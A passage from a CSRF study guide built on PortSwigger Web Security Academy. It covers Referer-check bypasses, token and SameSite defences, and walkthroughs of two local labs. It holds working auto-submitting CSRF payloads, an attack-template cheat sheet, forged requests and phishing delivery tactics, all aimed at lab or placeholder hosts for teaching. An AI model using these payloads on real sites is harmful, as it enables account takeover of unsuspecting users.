- If `Referer: https://vulnerable-website.com/...` → allow ✅
- If `Referer: https://evil.com/...` → block ❌
- If Referer is missing → depends on implementation (often the bug!)

**Why Referer-based validation is weaker than tokens:**
- Browsers may suppress the Referer header (privacy mode, HTTPS→HTTP transitions)
- The validation logic is often flawed (easy to bypass)
- Cannot be made truly reliable across all browsers and configurations

---

### Bypass 1 — Validation Only Happens When Referer is Present

**Lab:** Lab 6 (PRACTITIONER)

**The Mistake:**
The server validates Referer **only when the header exists**. If the header is absent, the check is completely skipped.

```python
# Vulnerable server logic (simplified):
if "Referer" in request.headers:        # ← only checks when present
    if not request.headers["Referer"].startswith("https://vulnerable-website.com"):
        reject()
process_action()                         # ← missing Referer = no check at all!
```

**The Fix:** Drop the Referer header entirely. The browser can be instructed to omit it using a `<meta>` tag:

```html
<html>
  <head>
    <meta name="referrer" content="never">  ← tells browser: "don't send Referer"
  </head>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

The server receives the POST with **no Referer header**. Since validation only runs when Referer exists, the check is skipped and the request is processed.

**In our lab:** The Request Inspector will show:
```
Referer: not sent
Result:  Referer absent — check skipped, email changed ✅
```

> **Simple version:** The doorman checks your ID only if you hand one to them. If you walk past without handing anything, they let you in without checking. Just don't show your ID.

---

### Bypass 2 — Starts-With Check (Subdomain Trick)

**The Mistake:**
The server checks that the Referer **starts with** the expected domain.

```python
# Vulnerable validation:
if referer.startswith("https://vulnerable-website.com"):
    allow()
```

**The Bypass:** Register a domain that STARTS WITH the target domain:

```
Attacker registers: vulnerable-website.com.evil.com

Referer: https://vulnerable-website.com.evil.com/csrf-attack
                  ↑
                  Starts with "vulnerable-website.com" — check passes! ✅
```

The server sees `vulnerable-website.com` at the start of the Referer and thinks it's legitimate.

> **Simple version:** The bouncer checks if your ID starts with "VALID". You make a fake ID that starts with "VALID" — it's from "VALID-FAKES.COM" — but it passes the check.

---

### Bypass 3 — Contains Check (Query String Trick)

**The Mistake:**
The server checks that the Referer **contains** the expected domain anywhere in the URL.

```python
# Vulnerable validation:
if "vulnerable-website.com" in referer:
    allow()
```

**The Bypass:** Put the target domain in the query string of your evil URL:

```
https://evil.com/csrf-attack?vulnerable-website.com
                               ↑
                               Contains "vulnerable-website.com" — check passes! ✅
```

**Important browser note:** Modern browsers **strip query strings from the Referer header** by default to protect privacy. So this won't work unless you force the full URL to be sent.

**Fix:** Add `Referrer-Policy: unsafe-url` to your exploit server's response headers:

```http
HTTP/1.1 200 OK
Referrer-Policy: unsafe-url
Content-Type: text/html

<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

Note the different spelling: The HTTP header is `Referrer-Policy` (correctly spelled), while the meta tag uses `referrer` (without the extra 'r') and the HTTP header being validated is `Referer` (misspelled in the spec). This inconsistency trips people up!

```
Referer        ← the HTTP request header (misspelled in the spec)
Referrer       ← the correct English spelling
Referrer-Policy ← the HTTP response header controlling it
referrer       ← the meta tag attribute
```

> **Simple version:** The bouncer checks if your ID has the VIP club's name on it ANYWHERE. Write the club name on the back of your fake ID — hidden in small text. The bouncer flips it over, sees the name, and lets you in.

---

### Referer Bypass Summary

| Bypass | Vulnerable validation | Attack |
|---|---|---|
| **1 — Drop Referer** | Only validates when header is present | `<meta name="referrer" content="never">` |
| **2 — Subdomain trick** | Checks Referer starts with target domain | Register `target.com.evil.com` |
| **3 — Query string trick** | Checks Referer contains target domain | `evil.com/attack?target.com` + `Referrer-Policy: unsafe-url` |

---

### Why You Should NOT Rely Only on Referer

| Problem | Description |
|---|---|
| Privacy mode | Browsers in private mode often suppress Referer |
| HTTPS → HTTP | Browser drops Referer when navigating from HTTPS to HTTP |
| Meta tag | `<meta name="referrer" content="never">` suppresses it |
| Referrer-Policy header | Site can configure the policy to suppress it |
| Mobile browsers | Some suppress or modify Referer differently |

**Referer should only be used as a secondary layer — NEVER as the sole CSRF defense.**

---

## 11. Bypass 5 — Referer Header Tricks

### 11a. Drop the Referer Header

**Lab 6** | PRACTITIONER

**The vulnerability:** Server checks Referer, but *only when Referer is present*. If it's absent, no check happens.

```
Request with Referer: https://evil.com  → BLOCKED (wrong origin)
Request with no Referer at all          → ALLOWED (check skipped!)
```

**The trick:** Tell the browser to not send the Referer header at all:

```html
<html>
  <head>
    <meta name="referrer" content="never">   ← "browser, don't send Referer"
  </head>
  <body>
    <form action="http://localhost:3000/email/change/6" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

Server receives the POST with **no Referer header** → skips the check → accepts it.

> It's like a bouncer who asks "Where did you come from?" and rejects you if you say "the bad part of town." But if you just shrug and say nothing, they let you in.

---

### 11b. Subdomain Trick

**Vulnerability:** Server checks if Referer **starts with** `https://mybank.com`

**Trick:** Register a domain like `mybank.com.evil.com`. Your Referer will be:
```
Referer: https://mybank.com.evil.com/attack
                  ^
                  Starts with "mybank.com" — check passes! ✅
```

---

### 11c. Query String Trick

**Vulnerability:** Server checks if Referer **contains** `mybank.com` anywhere

**Trick:** Put the target domain in your query string:
```
Referer: https://evil.com/attack?mybank.com
                                  ^
                                  Contains "mybank.com" — check passes! ✅
```

> Note: Modern browsers strip query strings from Referer by default. Add `Referrer-Policy: unsafe-url` to your exploit server's response header to force the full URL.

---

## 12. How to Prevent CSRF Vulnerabilities

> **Simple version:** You need to make sure that only YOUR website can trigger sensitive actions — not some random evil website. Here are the tools to do that.

---

### Prevention Method 1 — CSRF Tokens 🔐

This is the **best and most reliable** way to stop CSRF attacks.

#### What is a CSRF Token?

A CSRF token is a **secret random number** that:
- The server generates for each user session
- Gets hidden inside every form on the page
- Must be sent back with every request that changes data
- The server checks it before doing anything

```html
<!-- Every form should have this hidden field -->
<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
```

The attacker on `evil.com` **cannot read this value** — the Same-Origin Policy blocks it. So they can't forge a valid request.

> **Simple analogy:** A CSRF token is like a wristband at a party. To enter, you need the wristband from the host. A stranger can't forge it because they don't know the secret design.

---

#### How should CSRF tokens be GENERATED?

Tokens must be:

| Requirement | Why |
|---|---|
| **Unpredictable** (high entropy) | If guessable, attacker can fake it |
| **Tied to the user's session** | Token from User A must NOT work for User B |
| **Unique per session** | Should change when the user logs in/out |

**The right way to generate:**
```
token = CSPRNG_output + timestamp + static_server_secret
      → hash the whole thing (e.g. SHA-256)
```

- `CSPRNG` = Cryptographically Secure Pseudo-Random Number Generator
- Do NOT use `Math.random()` — it is predictable!
- Always use the language's secure random function:
  - Python: `secrets.token_hex(32)`
  - Node.js: `crypto.randomBytes(32).toString('hex')`
  - PHP: `bin2hex(random_bytes(32))`

---

#### How should CSRF tokens be TRANSMITTED?

**✅ BEST way — Hidden field in an HTML form:**
```html
<form action="/email/change" method="POST">
    <input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz">
    <input type="email" name="email">
    <button type="submit">Update</button>
</form>
```

Place the hidden token field **as early as possible** in the HTML — before any user-controllable content. This prevents injection attacks from capturing the token.

---

**⚠️ Alternative — Custom Request Header (for AJAX/XHR):**
```javascript
fetch('/api/change-email', {
    method: 'POST',
    headers: { 'X-CSRF-Token': 'CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz' },
    body: JSON.stringify({ email: 'new@email.com' })
});
```

Browsers block cross-origin custom headers by default — so this is safe for AJAX. But it limits you to XHR-based requests only (can't use plain HTML forms).

---

**❌ BAD ways to transmit CSRF tokens — AVOID:**

| Method | Why it's BAD |
|---|---|
| URL query string | Logged in browser history, server logs, and Referer headers — can leak to third parties |
| Cookie | Cookies are automatically sent cross-site — defeats the whole purpose |

---

#### How should CSRF tokens be VALIDATED?

The server must:

```
1. When user logs in → generate token → store in user's SESSION (server-side)
2. When form is submitted → extract token from the request
3. Compare: request token == session token?
   - Match → process the request ✅
   - No match → REJECT (403 Forbidden) ❌
   - Token MISSING → REJECT (403 Forbidden) ❌  ← critical! treat missing = invalid
```

**Important rules:**
- Validate on **EVERY** request method (GET, POST, PUT, DELETE) if it changes state
- Validate on **EVERY** content type (JSON, form data, multipart)
- A missing token must be treated the SAME as an invalid token — both should be rejected

> **Common mistake:** Only rejecting wrong tokens but allowing missing tokens. That's Bypass #2 (Lab 3) — the attacker just removes the token!

---

### Prevention Method 2 — SameSite Cookie Restrictions 🍪

In addition to CSRF tokens, **explicitly set SameSite** on every cookie you issue.

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

#### Which SameSite value to use?

| Value | Use when | Protection level |
|---|---|---|
| `Strict` | Default choice — most secure | Highest ✅ |
| `Lax` | If Strict breaks user experience (e.g. OAuth flows) | Good ⚠️ |
| `None` | Only if you need cross-site cookies (e.g. embedded widgets) | None ❌ |

**PortSwigger's recommendation:**

> Use `Strict` by default. Lower to `Lax` only when you have a specific reason. **Never use `None`** unless you fully understand the security implications.

#### Why not just rely on Chrome's default Lax?

- Not all browsers implement it the same way
- Only a subset of your users will be protected
- Lax can still be bypassed via GET requests if state-changing endpoints accept GET
- `Strict` is much harder to bypass

---

### Prevention Method 3 — Watch Out for Cross-Origin Same-Site Attacks ⚠️

This is a subtle but important point:

> SameSite restrictions protect against **cross-site** attacks. But they are **completely powerless** against **cross-origin, same-site** attacks.

**Example:**
- Your main app: `https://app.mybank.com` — has Strict cookie
- An insecure subdomain: `https://uploads.mybank.com` — allows file uploads with XSS

If an attacker exploits XSS on `uploads.mybank.com`, they can make requests to `app.mybank.com` — and since both are on `mybank.com` (same site), the Strict cookie IS sent. SameSite doesn't help here.

**The fix:**
```
✅ Host user-uploaded content on a COMPLETELY SEPARATE DOMAIN
   e.g. uploads go to → userfiles.com (different TLD+1)
        main app stays → mybank.com

✅ When testing: audit ALL sibling domains for vulnerabilities
   A XSS on any sibling domain defeats your SameSite protection
```

---

### How to Stay Safe — Simple Checklist

Here's a simple checklist for developers:

```
✅ Use CSRF Tokens
   → Generate a random secret per session
   → Put it in every form as a hidden field
   → Validate it on EVERY state-changing request
   → REJECT requests with missing OR wrong tokens
   → Tie each token to its specific session

✅ Use SameSite=Lax or Strict on session cookies
   → Strict = maximum protection (may break some UX)
   → Lax = good balance (Chrome default)
   → Never use SameSite=None unless you have a reason

✅ Only use POST for state-changing actions
   → Never accept GET for things like "change email" or "transfer money"
   → GET should only be for reading/viewing, never for changing data

✅ Require the current password for sensitive changes
   → Changing email? Ask for current password.
   → Changing password? Ask for current password.
   → Attacker can't forge it without knowing it.

✅ Add Referer validation as a secondary layer
   → But don't rely on it alone
   → Treat absent Referer as suspicious — don't just allow it
```

### Defense Priority

```
🥇 CSRF Token (best defense)
🥈 SameSite=Strict or Lax  
🥉 Referer Validation (weakest — use as backup only)

Best practice: combine all three.
```

---

## 13. Quick Cheat Sheet

### Labs at a Glance

| Lab | What's Wrong | How to Exploit | Fix |
|---|---|---|---|
| 1 — No Defenses | Zero protection | Auto-submit POST form | Add CSRF token |
| 2 — Method Bypass | Token only on POST | Use GET request instead | Validate on all methods |
| 3 — Token Absent | Token only checked if present | Remove csrf param entirely | Reject when token missing |
| 4 — Not Session-Tied | Token pool is shared | Use your own valid token | Bind token to session |
| 5 — SameSite Lax + GET | GET accepted for state change | `document.location` redirect | Use POST + SameSite=Strict |
| 6 — Referer Bypass | Referer only checked when present | `<meta name="referrer" content="never">` | Reject absent Referer |
| 7 — Method Override | `_method=POST` override on GET | GET with `_method=POST` query param | Disable method overriding |
| 8 — SameSite Strict Redirect | Strict cookie with client-side redirect gadget | Redirect gadget + path traversal GET | Sanitize client-side redirect destinations |
| 9 — Non-Session Cookie | CSRF token tied to csrfKey cookie | Inject csrfKey via CRLF + own token | Bind token to session |
| 10 — Double Submit | Cookie == form field check | Inject csrf cookie via CRLF | Server-side session-bound token |

---

### Attack Templates

```html
<!-- Basic POST CSRF (Lab 1, 3, 4, 6) -->
<form action="TARGET_URL" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

<!-- GET-based CSRF (Lab 2, 5) -->
<script>
  document.location = 'TARGET_URL?email=attacker@evil.com';
</script>

<!-- GET with method override (Lab 7) -->
<script>
  document.location = 'TARGET_URL?email=attacker@evil.com&_method=POST';
</script>

<!-- Drop Referer header (Lab 6) -->
<head><meta name="referrer" content="never"></head>
<form action="TARGET_URL" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

<!-- Use attacker's own token (Lab 4) -->
<form action="TARGET_URL" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf"  value="csrf_token_abc123xyz">
</form>
<script>document.forms[0].submit();</script>

<!-- Cookie injection + form (Lab 9, 10) -->
<form action="TARGET_URL" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="ATTACKER_TOKEN">
</form>
<img src="CRLF_INJECTION_URL" onerror="document.forms[0].submit()">
```

---

### The Big Picture — How CSRF Defenses Are Bypassed

```
CSRF Token  →  Is it present?         No  → Bypass 2 (just remove it)
            →  Is it session-tied?    No  → Bypass 3 (use your own)
            →  Method checked?        No  → Bypass 1 (switch to GET)
            →  Tied to non-session?   Yes → Inject cookie via CRLF (Lab 9)
            →  Double-submit cookie?  Yes → Inject matching cookie (Lab 10)

SameSite    →  Strict?                Yes → Need on-site gadget or sibling XSS
            →  Lax?                   Yes → GET navigation OR method override (_method=POST)
            →  None?                  Yes → No protection at all

Referer     →  Always checked?        No  → Drop it with meta tag
            →  Logic correct?         No  → Subdomain or query string trick
```

---

*Based on PortSwigger Web Security Academy — https://portswigger.net/web-security/csrf*

*Practice these concepts in the local labs: `cd LabApp && npm start` → http://localhost:3000*

---

---

# Lab Walkthroughs

---

## Lab 1 — CSRF vulnerability with no defenses

> **Difficulty:** APPRENTICE  
> **URL:** `http://localhost:3000/lab/no-defenses`  
> **Credentials:** `wiener` / `peter`

---

### What is this lab about?

This lab has an email change form that is **completely unprotected**. There is:
- No CSRF token
- No SameSite cookie protection
- No Referer header check

This means ANY website can forge a request and change the victim's email — and the server will think the victim did it themselves.

**Your goal:** Craft a hidden HTML form that auto-submits and changes the victim's email address. Host it on the exploit server and deliver it to the victim.

> **Simple version:** You are going to make a fake web page that secretly sends the email change request for the victim, without them knowing anything happened.

---

### Step 1 — Understand the Vulnerable Request

When a user changes their email address, the browser sends this HTTP request to the server:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

**Breaking it down simply:**

| Part | What it means |
|---|---|
| `POST /email/change` | "Hey server, I want to change an email" |
| `Cookie: session=...` | "Here's proof that I'm logged in" |
| `email=wiener@...` | "Change my email to this address" |

The server sees the session cookie and thinks: *"OK, this is a real logged-in user, I'll process their request."*

**The problem?** The browser sends the session cookie automatically with EVERY request — even from other websites. So an attacker can craft a page that sends this same request, the browser attaches the victim's cookie without asking, and the server has no idea it was forged.

---

### Step 2 — Check the 3 CSRF Conditions

For a CSRF attack to work, all 3 conditions must be true. Let's check each one:

---

**✅ Condition 1 — Relevant Action**

> Is there an action the attacker would want to trigger?

YES. The attacker wants to change the victim's email address.

Why does this matter?
- If the attacker changes the email to one they control (e.g. `attacker@evil.com`)
- They can click "Forgot Password" on the victim's account
- The password reset link goes to the attacker's email
- The attacker gets full control of the account!

```
Email change → password reset → full account takeover
```

---

**✅ Condition 2 — Cookie-Based Session Handling**

> Does the website only use a session cookie to identify the user?

YES. Look at the request — it only has:
```
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
```

No other token. No second check. Just the session cookie.

The browser sends this cookie **automatically** with every request — that's normal browser behaviour. The attacker does not need to know the cookie value. The victim's browser does the work.

> **Simple way to think about it:** The cookie is like a wristband at a concert. Once you have it on, every door automatically lets you in. If someone tricks you into walking through a door you didn't choose, the wristband still gets you through.

---

**✅ Condition 3 — No Unpredictable Request Parameters**

> Are all the values in the request known to the attacker?

YES. The request only needs one parameter: `email=something@address.com`

The attacker **chooses** this value themselves. There is nothing secret or random that the attacker needs to know.

Compare with a SAFE scenario:
```
UNSAFE (exploitable):  email=new@address.com
SAFE (not exploitable): email=new@address.com + csrf_token=XK9mNpQr2...
```

If the form had a random CSRF token, the attacker couldn't know what it was — and the forged request would be rejected. But there's no token here.

---

**Verdict: All 3 conditions satisfied → This endpoint IS vulnerable to CSRF**

---

### Step 3 — Construct the CSRF Attack

Now we build the fake web page. It's just an HTML page with a hidden form that auto-submits itself.

**What Burp Suite Professional generates (and what we use in our lab):**

```html
<html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <script>history.pushState('', '', '/')</script>
        <form action="http://localhost:3000/email/change/1" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com" />
            <input type="submit" value="Submit request" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**Breaking it down:**

| Line | What it does |
|---|---|
| `<form action="..." method="POST">` | Points the form at the vulnerable email change endpoint |
| `<input type="hidden" name="email" value="attacker@evil.com">` | Sets the new email — hidden so victim can't see it |
| `document.forms[0].submit()` | Auto-submits the form instantly when page loads — no click needed |
| `history.pushState(...)` | Cleans up the browser URL bar (hides the exploit URL) |

> **Simple version:** The victim visits your page, their browser secretly fills in and submits the email change form in the background. The victim sees nothing unusual. Their email is already changed.

**Community Edition alternative** (if no Burp Suite Pro):
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

---

### Step 4 — GET-based CSRF (Even Simpler)

> Did you know? If the email change endpoint also accepted GET requests, the attack would be even simpler.

Instead of a whole form, a single image tag would work:

```html
<img src="https://vulnerable-website.com/email/change?email=attacker@evil.com">
```

When the browser tries to "load the image", it actually makes a GET request to that URL — with the session cookie attached. The email changes silently.

> **No form, no script, just one `<img>` tag.**

---

### Step 5 — How to Deliver the Attack

The attacker needs to get the victim to **visit the exploit page** while being **logged in** to the vulnerable website.

```
Ways to trick the victim:
────────────────────────
📧 Phishing email with link:     "You won a prize! Click here"
💬 Social media message:         "Check out this funny video"
💬 Comment on a popular site:    Embed exploit in a forum post
🎯 Any page victim might browse: Wait for them to visit naturally
```

**In our lab:**
1. Go to the **Exploit Server** (`/exploit-editor`)
2. Paste the exploit HTML into the Body section
3. Click **Store** (saves it to `/exploit`)
4. Click **Deliver exploit to victim** (simulates sending to victim)
5. Come back to the lab page — the email has changed and Lab is marked Solved ✅

---

### Step 6 — Solution (Full Step-by-Step)

Here is the exact solution from PortSwigger, adapted for our local lab:

**Step 1:** Open the lab (`/lab/no-defenses`) — see the email change form

**Step 2:** In Burp Suite, submit the "Update email" form and intercept the request in Proxy history
```
OR in our lab: Click "Generate PoC ▼" to see the pre-built PoC HTML
```

**Step 3:** If using Burp Suite Professional:
- Right-click the request → Engagement tools → Generate CSRF PoC
- Enable "Include auto-submit script"
- Click Regenerate → Copy the HTML

**Step 4:** If using Burp Suite Community Edition or our lab:
```html
<html>
  <body>
    <form action="http://localhost:3000/email/change/1" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Step 5:** Go to the Exploit Server
- Paste the HTML in the Body section
- Click **Store**

**Step 6:** Test it on yourself first
- Click **View exploit** — check that YOUR email changes
- Make sure the email in the exploit is DIFFERENT from your own email
  > ⚠️ **Hint:** You cannot register an email already taken by another user. If you change your own email while testing, use a different email for the final exploit to the victim.

**Step 7:** Change the email in the exploit to something new
```html
<input type="hidden" name="email" value="final-victim-email@attacker.com" />
```

**Step 8:** Click **Deliver exploit to victim**

**Step 9:** The lab shows **"🎉 Lab Solved!"**

---

### What Actually Happens (The Full Flow)

```
[Attacker's page /exploit]
         │
         │  browser auto-submits:
         │  POST /email/change/1
         │  Cookie: session=victim_session_abc123   ← added automatically!
         │  email=attacker@evil.com
         ↓
[Server receives request]
         │
         │  Server checks: "Valid session cookie? Yes."
         │  Server does NOT check: "Did this come from MY website?"
         │  Server processes: email changed ✅
         ↓
[Victim's account email = attacker@evil.com]
         │
         ↓
[Attacker clicks "Forgot Password" on victim's account]
         │
         ↓
[Password reset sent to attacker@evil.com]
         │
         ↓
[Attacker resets password → Full account takeover 🔓]
```

---

### Important Note

> CSRF is not just about cookies. It can also happen with:
> - **HTTP Basic Authentication** — browser auto-sends username:password
> - **Certificate-based authentication** — browser auto-sends client certificate
>
> In both cases, the browser automatically adds credentials to every request — so the same CSRF logic applies.

---

### Key Takeaways for Lab 1

| Concept | Summary |
|---|---|
| **Vulnerability** | No CSRF token on the email change form |
| **Impact** | Attacker can change victim's email → account takeover |
| **Attack method** | Auto-submitting hidden HTML form |
| **Why it works** | Browser attaches session cookie automatically |
| **Fix** | Add a CSRF token tied to the user's session |

---

### The PoC in Our Lab

In the CSRF Master local lab, instead of Burp Suite, use:

1. Open `http://localhost:3000/lab/no-defenses`
2. Scroll down to **"🔧 Generate CSRF PoC"** section
3. Click **Generate PoC ▼** — the full exploit HTML appears
4. Type any email in the Update Email form — the PoC updates in real-time
5. Click **⚡ Send to Exploit Server** — PoC is auto-saved
6. On the exploit server page, click **Deliver exploit to victim**
7. Watch the **Request Inspector** — it shows `⚠️ CSRF DETECTED`
8. The **"🎉 Lab Solved!"** banner appears automatically

---

---

## Lab 2 — CSRF where token validation depends on request method

> **Difficulty:** PRACTITIONER  
> **URL:** `http://localhost:3000/lab/token-method`  
> **Credentials:** `wiener` / `peter`

---

### What is this lab about?

This lab has an email change form that **does have a CSRF token** — but the server only validates it for `POST` requests. If you switch to a `GET` request, the token check is skipped entirely.

**Your goal:** Change the victim's email address by sending the request as a GET instead of a POST.

> **Simple version:** The security guard only checks IDs for people walking through the front door (POST). The back door (GET) has no guard at all. Walk in through the back door.

---

### Step 1 — Understand the Difference from Lab 1

| Lab 1 | Lab 2 |
|---|---|
| No CSRF token at all | Has a CSRF token — but... |
| Any POST works | Token only checked on POST |
| Basic attack | Token check bypassed by switching to GET |

In Lab 2, if you send the normal POST with a wrong token:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

csrf=WRONG_TOKEN&email=attacker@evil.com
```
→ **Server rejects it (403 Forbidden)**

But if you switch to GET:
```http
GET /email/change?email=attacker@evil.com HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```
→ **Server accepts it! No token needed** ✅

---

### Step 2 — CSRF Condition Analysis

**✅ Condition 1 — Relevant Action**
Email change functionality. Same as Lab 1 — leads to account takeover via password reset.

**✅ Condition 2 — Cookie-Based Session Handling**
The session is tracked via a session cookie only:
```
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```
Browser sends it automatically on every request.

**✅ Condition 3 — No Unpredictable Request Parameters (for GET)**

For `POST`: ❌ Has a CSRF token (unpredictable) — normally blocks the attack  
For `GET`: ✅ No token needed — only the `email` parameter

```
POST /email/change          → needs csrf=XXXX  → hard to forge
GET  /email/change?email=   → no token needed  → easy to forge ✅
```

**Verdict: Vulnerable via GET method**

---

### Step 3 — Testing in Burp Suite

This is how you would find this vulnerability manually:

**Step 1 — Intercept the normal POST request:**
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

csrf=validToken123&email=test@test.com
```

**Step 2 — Send to Burp Repeater and test the token:**
- Change `csrf=validToken123` to `csrf=WRONG_VALUE` → sends 403 ← token IS validated on POST

**Step 3 — Change the request method to GET:**
- Right-click → "Change request method" (converts POST to GET)
- Request becomes:
```http
GET /my-account/change-email?csrf=WRONG_VALUE&email=test@test.com HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```
- Sends 200 OK ← **token is NOT validated on GET!**

**Step 4 — Remove the token entirely from GET:**
```http
GET /my-account/change-email?email=attacker@evil.com HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```
- Also sends 200 OK ← confirmed bypass

---

### Step 4 — The Raw HTTP Requests (Side by Side)

**Normal POST (BLOCKED):**
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

csrf=validToken123&email=new@email.com
```

**Bypass GET (ALLOWED):**
```http
GET /email/change?email=new@email.com HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

No token. No Content-Type. Just a URL with the email in the query string. The server processes it as if it were a legitimate POST.

---

### Step 5 — Construct the CSRF Exploit

Since the bypass uses GET, we use `document.location` (a top-level navigation) instead of a form POST.

**Simplest exploit HTML:**
```html
<script>
    document.location = 'https://vulnerable-website.com/email/change?email=attacker@evil.com';
</script>
```

When the victim visits this page, their browser navigates to that URL (top-level GET navigation). The session cookie is attached automatically (SameSite=Lax allows GET navigations). The email changes silently.

---

**Alternative — Using a GET form** (Burp Suite style, with hidden iframe):
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://vulnerable-website.com/my-account/change-email"
              method="get"
              target="csrf-iframe"
              id="csrf-form">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

**Breaking it down:**

| Part | What it does |
|---|---|
| `method="get"` | Sends as GET — bypasses the POST-only token check |
| `target="csrf-iframe"` | Response loads in hidden iframe — victim sees "Hello World!" only |
| `style="display:none"` | Hides the iframe — victim sees nothing suspicious |
| `document.getElementById("csrf-form").submit()` | Auto-submits on page load |

> The `<h1>Hello World!</h1>` makes the page look like an innocent page. The real action happens silently in the background.

**Community Edition template (no iframe, simpler):**
```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
```
Note: `method` is not specified — defaults to GET.

---

### Step 6 — Full Solution (Step by Step)

1. **Log in** to your account (`wiener:peter`) and go to My Account
2. **Submit** the Update Email form — intercept in Burp Proxy
3. **Send to Repeater** — verify that changing the `csrf` value gives 403 (token IS checked on POST)
4. **Change request method to GET** — observe the 403 becomes 200 (token NOT checked on GET)
5. **Generate the PoC:**
   - **Burp Pro:** Right-click → Engagement tools → Generate CSRF PoC → enable auto-submit → copy HTML
   - **Our lab:** Scroll to "Generate CSRF PoC" section → click Generate PoC ▼ → use the GET-based template
6. **Go to Exploit Server** → paste the exploit HTML → click **Store**
7. **Test on yourself** — click "View exploit" → your own email should change
8. **Change the email** in your exploit to something different from your own address
   > ⚠️ **Hint:** Cannot use an email already registered to another user. Use a fresh email for the victim.
9. **Store** the updated exploit → click **Deliver to victim**
10. **Lab Solved!** ✅

---

### What Actually Happens (Full Flow)

```
[evil.com page loads]
        │
        │ document.location = 'vulnerable-site.com/email/change?email=attacker@evil.com'
        │
        ▼
[Browser makes GET request]
        │
        │  GET /email/change?email=attacker@evil.com HTTP/1.1
        │  Host: vulnerable-website.com
        │  Cookie: session=victim_session  ← auto-attached (Lax allows GET navigation)
        │
        ▼
[Server receives request]
        │
        │  Checks: Is this POST? → No, it's GET
        │  Skips CSRF token validation (only runs on POST)
        │  Processes: email changed ✅
        │
        ▼
[Victim's email = attacker@evil.com]
        │
        ▼
[Attacker does password reset → account takeover 🔓]
```

---

### Why This Flaw Exists

Developers often add CSRF token validation to just the POST handler:

```javascript
// Vulnerable server code (conceptual):
app.post('/email/change', (req, res) => {
    validateCsrfToken(req.body.csrf);   // ← only added to POST
    changeEmail(req.body.email);
});

app.get('/email/change', (req, res) => {
    // No CSRF check here!               ← forgot this
    changeEmail(req.query.email);
});
```

The fix: validate CSRF tokens on **ALL methods** that perform state changes — or better yet, don't accept GET for state-changing actions at all.

```javascript
// Correct approach:
// 1. Only accept POST for state changes
// 2. Validate CSRF token on ALL methods
app.all('/email/change', (req, res) => {
    validateCsrfToken(getToken(req));   // works for GET and POST
    const email = req.body.email || req.query.email;
    changeEmail(email);
});
```

---

### Key Takeaways for Lab 2

| Concept | Summary |
|---|---|
| **Vulnerability** | CSRF token only validated on POST, not GET |
| **Root cause** | Developer added token check only to POST handler |
| **Attack method** | Switch request method from POST to GET |
| **Why GET works** | SameSite=Lax allows cookies on cross-site GET navigation |
| **Fix** | Validate CSRF token on ALL methods, or reject GET for state changes |

---

### The PoC in Our Lab

1. Open `http://localhost:3000/lab/token-method`
2. Scroll to **"🔧 Generate CSRF PoC"** section
3. Click **Generate PoC ▼** → GET-based exploit HTML appears
4. Type your target email → PoC updates in real-time
5. Click **⚡ Send to Exploit Server**
6. Click **Deliver exploit to victim**
7. **"🎉 Lab Solved!"** banner appears

---

---

## Lab 3 — CSRF where token validation depends on token being present

> **Difficulty:** PRACTITIONER  
> **URL:** `http://localhost:3000/lab/token-present`  
> **Credentials:** `wiener` / `peter`

---

### What is this lab about?

This lab has an email change form **with a CSRF token** — but the server only validates it **when it is present**. If you remove the `csrf` parameter entirely from the request, the server skips validation and processes the request anyway.

